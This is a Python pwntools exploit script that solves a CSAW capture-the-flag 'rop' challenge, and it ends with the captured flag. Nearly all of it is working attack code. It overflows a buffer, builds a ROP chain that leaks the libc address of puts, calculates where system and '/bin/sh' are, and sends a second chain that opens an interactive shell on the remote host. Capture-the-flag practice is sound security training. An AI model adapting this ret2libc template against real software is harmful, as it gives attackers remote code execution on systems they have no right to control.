#!/usr/bin/env python3

from pwn import *

p = remote("pwn.chal.csaw.io", 5016)
elf = ELF("./rop")
libc = ELF("./libc-2.27.so")
"""
use ropper to find gadget:

ropper -f rop --search 'pop rdi'
0x0000000000400683: pop rdi; ret;

ropper -f rop --search 'ret'
0x000000000040048e: ret;
"""
pop_rdi = 0x400683
ret = 0x40048e
print(p.recvline())
exploit = b"a" * 40 + p64(pop_rdi) + p64(elf.got["puts"]) + p64(elf.symbols["puts"]) + p64(elf.symbols.main)
p.sendline(exploit)
leaked = p.recvline().strip(b'\n') + b'\x00\x00' # 8 byte align address
print(leaked, len(leaked))
puts_leak = u64(leaked)
log.info("puts libc is {}".format(hex(puts_leak)))
libc_base = puts_leak - libc.symbols.puts
system_addr = libc_base + libc.symbols.system
binsh_str = libc_base + next(libc.search(b"/bin/sh"))
log.info("got system at {}".format(hex(system_addr)))
log.info("got /bin/sh at {}".format(hex(binsh_str)))

exploit = b"a" * 40 + p64(pop_rdi) + p64(binsh_str)+ p64(ret) + p64(system_addr)
p.sendline(exploit)
p.interactive()

# flag{r0p_4ft3r_r0p_4ft3R_r0p}
